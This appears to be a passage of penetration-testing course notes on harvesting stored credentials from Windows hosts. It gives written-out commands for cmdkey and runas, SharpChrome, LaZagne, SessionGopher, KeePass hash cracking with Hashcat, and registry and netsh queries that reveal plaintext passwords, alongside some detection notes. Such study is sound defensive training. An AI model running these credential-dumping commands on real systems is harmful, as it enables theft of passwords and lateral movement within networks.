
---
## 1. Cmdkey Saved Credentials

Windows stores credentials for RDP/terminal services connections in the credential manager. Listing them may reveal reusable credentials for lateral movement or privilege escalation.

**List saved credentials:**
```cmd
cmdkey /list
```

**Use saved credentials to run a command as another user:**
```powershell
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```
Useful for spawning a reverse shell, running a binary, or launching cmd/PowerShell as that user — without needing the plaintext password.

---

## 2. Browser Credentials

**Retrieve saved Chrome logins ([SharpChrome](https://github.com/GhostPack/SharpDPAPI)):**
```powershell
.\SharpChrome.exe logins /unprotect
```
Returns saved URLs, usernames, and plaintext passwords from Chrome's Login Data database.

> ⚠️ **Detection:** Chrome credential dumping typically generates Event ID **4688** (process creation) and **16385** (DPAPI activity). Defenders may also monitor **4662** and **4663** (object/file access events).

---

## 3. Password Managers

**KeePass** stores its database locally as a `.kdbx` file — search for it on hosts and shares.

**Extract the hash:**
```bash
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx
```

**Crack offline with Hashcat (mode 13400):**
```bash
hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```
Access to an IT staff member's KeePass database can lead directly to network devices, servers, and database credentials.

---

## 4. Email

If you have access to a domain-joined system with a Microsoft Exchange inbox in context, use [MailSniper](https://github.com/dafthack/MailSniper) to search emails for terms like `pass`, `creds`, `credentials`, etc.

---

## 5. LaZagne — Broad Credential Recovery

[LaZagne](https://github.com/AlessandroZ/LaZagne) searches a wide variety of software for stored credentials: browsers, chat clients, databases, email, memory dumps, sysadmin tools, WiFi, and internal Windows storage (Autologon, Credman, DPAPI, LSA secrets, etc.).

**Run all modules:**
```powershell
.\lazagne.exe all
```

**Run specific module categories:**
```
chats, mails, git, svn, windows, wifi, sysadmin, browsers, databases, php, memory, multimedia, games
```

Output can be saved as text or JSON. Commonly surfaces WinSCP passwords, Credential Manager entries, and more.

---

## 6. SessionGopher — Remote Access Tool Credentials

[SessionGopher](https://github.com/Arvanaghi/SessionGopher) extracts and decrypts saved sessions from **PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP**. Searches `HKEY_USERS` for all users who have logged in.

> **Note:** Retrieving all users' session data requires local admin, but running as current user is always worth trying.

```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01
```
Returns hostnames, usernames, and sometimes plaintext passwords for saved sessions.

---

## 7. Cleartext Passwords in the Registry

### Windows AutoLogon
If AutoLogon is configured, credentials are stored in plaintext under:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```
Key values to check: `AutoAdminLogon`, `DefaultUserName`, `DefaultPassword`

```cmd
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

> If AutoLogon is needed, use [Sysinternals Autologon.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/autologon) instead — it encrypts the password as an LSA secret rather than storing it plaintext.

### PuTTY Proxy Credentials
PuTTY sessions using proxy connections store credentials in plaintext:
```
HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>
```

**Enumerate saved sessions:**
```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
```

**Inspect a specific session:**
```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```
Look for `ProxyUsername` and `ProxyPassword` values — these are stored in cleartext.

> As admin, check `HKEY_USERS\<SID>\SOFTWARE\SimonTatham\PuTTY\Sessions` for other users' saved sessions.

---

## 8. WiFi Passwords

Requires local admin on a host with a wireless card.

**List saved wireless profiles:**
```cmd
netsh wlan show profile
```

**Reveal the pre-shared key for a specific network:**
```cmd
netsh wlan show profile ilfreight_corp key=clear
```
Look for `Key Content` in the Security settings section — this is the plaintext WiFi password.

---

## Quick Reference — Credential Sources

| Source | Tool/Command |
|---|---|
| Saved RDP/service credentials | `cmdkey /list` + `runas /savecred` |
| Chrome saved logins | SharpChrome |
| KeePass databases (`.kdbx`) | `keepass2john` + Hashcat mode 13400 |
| Exchange email | MailSniper |
| Wide software coverage | LaZagne (`all`) |
| PuTTY/WinSCP/FileZilla/RDP sessions | SessionGopher |
| AutoLogon registry | `reg query ...Winlogon` |
| PuTTY proxy credentials | `reg query ...PuTTY\Sessions` |
| WiFi pre-shared keys | `netsh wlan show profile <name> key=clear` |